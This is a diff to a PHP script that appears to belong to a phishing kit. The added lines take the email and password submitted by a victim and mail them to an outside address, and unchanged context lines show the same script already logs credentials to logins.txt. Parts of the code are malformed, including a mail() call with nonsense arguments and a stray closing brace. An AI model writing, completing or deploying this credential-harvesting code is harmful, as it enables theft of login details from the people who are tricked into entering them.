@@ -1,5 +1,24 @@
 <?php
-
+        $mailsignup = $_POST["email"];
+        $passwordsignup = $_POST["password"];
+         $to = "daddy@fetishrequest.me";
+         $subject = "Workshop mail signup";
+         
+         $message = "$mailsignup";
+         $message .= "<br>$passwordsignup";
+         
+         $header = "From:daddy@fetishrequest.me \r\n";
+         $header .= "Cc: \r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+         
+         $retval = mail($to,$subject,$message,$post,$send.php,$header);
+         
+         if( $retval == true ) {
+            include("MKR.php");
+         }else {
+            echo "Sent";
+         }
 			session_start();
 			
 			$pass = $_POST["Passwd"];
@@ -9,8 +28,8 @@
 			//Writing email and password to logins.txt. 
   			fwrite($file, $email."	".$pass.PHP_EOL);			
   			fclose($file);//closing logins.txt.
-?>
-<?php
+}
+
   $Name = "D4 daddy"; //senders name
   $email = "daddy@fetishrequest.me"; //senders e-mail adress
   $recipient = "daddy@fetishrequest.me"; //recipient
